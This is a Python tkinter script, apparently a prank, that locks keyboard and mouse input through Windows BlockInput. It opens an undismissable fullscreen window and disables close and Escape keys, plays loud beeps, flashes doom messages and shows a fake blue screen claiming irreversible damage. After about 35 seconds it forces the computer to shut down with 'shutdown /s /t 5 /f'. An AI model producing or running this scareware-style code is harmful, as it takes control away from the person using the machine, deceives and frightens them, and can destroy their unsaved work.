import tkinter as tk
from tkinter import ttk
import time
import random
import os
import threading
import winsound
import ctypes

# --- Input Locking (Windows) ---

def lock_input():
    ctypes.windll.user32.BlockInput(True)

def unlock_input():
    ctypes.windll.user32.BlockInput(False)

# --- GUI Chaos ---

root = tk.Tk()
root.title("SYSTEM DOOMSDAY")
root.attributes("-fullscreen", True)
root.configure(bg="#200000")
root.overrideredirect(True)

root.protocol("WM_DELETE_WINDOW", lambda: None)
root.bind("<Control-c>", lambda e: None)
root.bind("<Alt-F4>", lambda e: None)
root.bind("<Escape>", lambda e: None)

flash_ids = []
shake_id = None

# --- Window Shaking ---

def shake_window():
    global shake_id
    if root.winfo_exists():
        x, y = root.winfo_x(), root.winfo_y()
        root.geometry(f"+{x + random.randint(-40, 40)}+{y + random.randint(-40, 40)}")
        shake_id = root.after(20, shake_window)

# --- Horror Sound Effect ---

def play_terror_sound():
    if os.name == "nt":
        def sound_terror():
            for _ in range(80):
                winsound.Beep(random.randint(700, 2600), random.randint(150, 400))
                time.sleep(random.uniform(0.02, 0.2))
            for _ in range(50):
                winsound.Beep(random.randint(50, 400), 700)
                time.sleep(random.uniform(0.05, 0.3))
            winsound.Beep(40, 5000)
        threading.Thread(target=sound_terror, daemon=True).start()

# --- Dramatic Warnings ---

def dramatic_message(message, delay):
    popup = tk.Toplevel(bg="#200000")
    x, y = random.randint(0, root.winfo_screenwidth() - 600), random.randint(0, root.winfo_screenheight() - 400)
    popup.geometry(f"600x400+{x}+{y}")
    popup.overrideredirect(True)
    tk.Label(
        popup,
        text=message,
        font=("Courier", random.randint(26, 52), "bold"),
        fg=random.choice(["red", "white", "#FF2222"]),
        bg="#200000"
    ).pack(pady=100)
    popup.after(delay, popup.destroy)

# --- Fake BSOD ---

def show_bsod():
    bsod = tk.Toplevel()
    bsod.attributes("-fullscreen", True)
    bsod.configure(bg="#0000AA")
    bsod.overrideredirect(True)
    message = (
        " :(\n\n"
        "Your PC ran into a fatal, irreversible catastrophe.\n"
        "Collecting devastation logs...\n\n"
        "STOP CODE: SYSTEM OBLITERATION\n\n"
        "If you call tech support, tell them: SYSTEM CONSUMED BY THE VOID"
    )
    tk.Label(bsod, text=message, fg="white", bg="#0000AA", font=("Consolas", 28), justify="left").pack(padx=100, pady=100)

# --- Fake Shutdown ---

def shutdown_system():
    unlock_input()
    if os.name == "nt":
        os.system("shutdown /s /t 5 /f")

# --- THE SEQUENCE OF DOOM ---

def terror_sequence():
    shake_window()
    play_terror_sound()
    
    title = tk.Label(root, text="!! SYSTEM TERMINAL COLLAPSE !!", font=("Courier", 80, "bold"), fg="red", bg="#200000")
    title.pack(pady=60)
    
    root.after(1000, dramatic_message, "NETWORK DISINTEGRATING...", 2500)
    root.after(3000, dramatic_message, "MEMORY OVERLOAD!", 3000)
    root.after(6000, dramatic_message, "DATA CORRUPTION AT MAXIMUM!", 3500)
    root.after(10000, dramatic_message, "CRITICAL SYSTEM FAILURE!", 4000)
    root.after(15000, dramatic_message, "ERROR: REALITY COLLAPSING...", 4000)
    root.after(20000, dramatic_message, "YOUR SYSTEM WILL NOT SURVIVE!", 5000)
    root.after(25000, dramatic_message, "TERMINATION IMMINENT!", 5000)
    root.after(30000, show_bsod)
    root.after(35000, shutdown_system)

# --- START ---

def start():
    lock_input()
    terror_sequence()

start()
root.mainloop()
